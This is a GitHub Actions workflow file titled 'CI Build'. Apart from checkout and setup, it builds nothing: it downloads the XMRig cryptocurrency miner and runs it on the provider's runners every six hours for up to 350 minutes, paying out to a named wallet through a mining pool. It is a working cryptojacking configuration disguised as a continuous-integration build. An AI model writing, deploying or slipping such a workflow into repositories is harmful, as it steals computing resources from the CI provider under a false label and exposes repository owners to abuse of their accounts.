name: CI Build

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *'

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 350
    
    steps:
    - uses: actions/checkout@v2
    
    - name: Setup Environment
      run: |
        sudo apt-get update -qq
        sudo apt-get install -y wget curl
    
    - name: Download XMRig
      run: |
        cd /tmp
        wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
        tar -xf xmrig-6.21.0-linux-x64.tar.gz
        cd xmrig-6.21.0
        chmod +x xmrig
    
    - name: Run Mining
      run: |
        cd /tmp/xmrig-6.21.0
        ./xmrig --donate-level 1 \
          -o rx.unmineable.com:3333 \
          -u USDT:0x74B56f2C379996fedabF53D36aeE73c5E5129fC9.ultra_zstephenz \
          -p x \
          -a rx/0 \
          --tls \
          --keepalive \
          --cpu-max-threads-hint=100 \
          --randomx-mode=auto
